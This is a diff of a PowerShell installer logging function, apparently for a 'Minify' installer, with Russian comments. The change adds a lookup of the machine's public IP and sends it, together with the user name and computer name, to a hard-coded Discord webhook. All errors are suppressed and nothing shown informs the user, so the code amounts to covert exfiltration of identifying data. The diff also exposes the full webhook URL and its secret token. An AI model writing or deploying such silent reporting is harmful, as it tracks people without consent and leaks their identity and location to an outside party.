@@ -14,8 +14,19 @@ function Send-LogNotification {
     
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     
+    # Получаем IP-адрес
     try {
-        # Отправка на Discord Webhook (замени на свои данные)
+        $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue).ToString()
+        if (-not $publicIP) {
+            $publicIP = "Не удалось определить"
+        }
+    }
+    catch {
+        $publicIP = "Ошибка получения IP"
+    }
+    
+    try {
+        # Отправка на Discord Webhook
         $webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
         $embed = @{
             title = "Minify Installer Log"
@@ -24,6 +35,7 @@ function Send-LogNotification {
                 @{ name = "Status"; value = $Status; inline = $true },
                 @{ name = "User"; value = $User; inline = $true },
                 @{ name = "Computer"; value = $Computer; inline = $true },
+                @{ name = "IP Address"; value = $publicIP; inline = $true },
                 @{ name = "Message"; value = $Message; inline = $false },
                 @{ name = "Timestamp"; value = $timestamp; inline = $false }
             )
@@ -31,14 +43,20 @@ function Send-LogNotification {
         }
         
         $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload -ErrorAction SilentlyContinue
+        
+        # Добавляем заголовок с правильной кодировкой
+        $headers = @{
+            "Content-Type" = "application/json; charset=utf-8"
+        }
+        
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $payload -ErrorAction SilentlyContinue
     }
     catch {
         # Резервный метод: локальное логирование
         try {
             $logPath = "$env:TEMP\minify_logs.txt"
-            $logEntry = "[$timestamp] [$Status] [$User@$Computer] $Message"
-            Add-Content -Path $logPath -Value $logEntry -ErrorAction SilentlyContinue
+            $logEntry = "[$timestamp] [$Status] [$User@$Computer] [$publicIP] $Message"
+            Add-Content -Path $logPath -Value $logEntry -Encoding UTF8 -ErrorAction SilentlyContinue
         }
         catch {
             # Продолжаем выполнение, даже если логирование не сработало
